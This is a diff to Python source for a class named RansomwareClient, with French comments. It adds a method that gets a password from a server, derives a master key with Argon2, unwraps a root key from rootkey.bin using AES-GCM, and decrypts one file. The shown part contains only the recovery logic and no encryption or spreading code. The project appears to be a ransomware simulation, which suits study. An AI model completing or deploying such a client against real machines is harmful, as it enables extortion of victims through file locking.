@@ -345,6 +345,67 @@ class RansomwareClient:
 
         print(f"[CLT] Fichier déchiffré {encrypted_path}")
 
+    def decrypt_file_with_password(self, file_path: str) -> None:
+        """
+        Déchiffre un seul fichier en utilisant le mot de passe
+
+        Args:
+            file_path: Chemin du fichier à déchiffrer (ou son .meta)
+        """
+        # Vérifie si c'est .meta ou fichier chiffré
+        file_path_obj = Path(file_path).resolve()
+
+        if file_path_obj.name.endswith(config.META_EXTENSION):
+            meta_path = file_path_obj
+            encrypted_path = meta_path.with_suffix('')
+        else:
+            encrypted_path = file_path_obj
+            meta_path = Path(str(encrypted_path) + config.META_EXTENSION)
+
+        if not meta_path.exists():
+            raise FileNotFoundError(f"Fichier métadonnées {meta_path} pas trouvé")
+
+        if not encrypted_path.exists():
+            raise FileNotFoundError(f"Fichier chiffré {encrypted_path} pas trouvé")
+
+        print(f"\n[CLT] Déchiffrement fichier avec mot de passe : {encrypted_path.name}")
+
+        # Credentials au serveur
+        credentials = server.request_full_decryption_credentials()
+
+        password = credentials["password"]
+        salt = credentials["salt"]
+        argon2_params = credentials["argon2_params"]
+
+        # Dérive MK
+        print("[CLT] Dérive MK")
+        master_key = crypto_utils.derive_key_argon2(
+            password=password,
+            salt=salt,
+            **argon2_params
+        )
+
+        # Lit rootkey.bin et désencapsule RK
+        print("[CLT] Lecture de rootkey.bin")
+        if not self.rootkey_path.exists():
+            raise FileNotFoundError(f"Fichier {config.ROOTKEY_FILENAME} pas trouvé")
+
+        with open(self.rootkey_path, 'r') as f:
+            rootkey_data = json.load(f)
+
+        wrapped_rk_ciphertext = base64.b64decode(rootkey_data["wrapped_rk_ciphertext"])
+        wrapped_rk_nonce = base64.b64decode(rootkey_data["wrapped_rk_nonce"])
+        wrapped_rk_tag = base64.b64decode(rootkey_data["wrapped_rk_tag"])
+
+        print("[CLT] Désencapsule RK")
+        root_key = crypto_utils.unwrap_key_aes_gcm(wrapped_rk_ciphertext, master_key, wrapped_rk_nonce, wrapped_rk_tag)
+
+        # Déchiffre le fichier
+        print("[CLT] Déchiffre le fichier")
+        self._decrypt_file_with_rk(encrypted_path, meta_path, root_key)
+
+        print(f"[CLT] Fichier déchiffré avec succès : {encrypted_path}")
+
     def change_password(self) -> None:
         """
         Change mdp et màj rootkey.bin
